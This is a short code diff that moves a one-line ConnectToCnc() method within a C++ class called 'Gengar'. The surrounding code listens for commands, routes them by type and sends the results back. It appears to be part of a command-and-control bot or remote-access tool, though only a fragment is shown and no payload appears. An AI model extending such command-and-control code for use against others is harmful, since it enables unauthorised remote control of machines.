@@ -1,5 +1,7 @@
 #include "gengar.h"
 
+void Gengar::ConnectToCnc() { m_client.Connect(); }
+
 void Gengar::ListenForCommand()
 {
 	constexpr auto TYPE_CONTENT_DELIMITER = ':';
@@ -39,5 +41,3 @@ void Gengar::RouteCommand(std::string type, std::string content)
 		output = "Unknown command type.";
 	m_client.Send(output);
 }
-
-void Gengar::ConnectToCnc() { m_client.Connect(); }
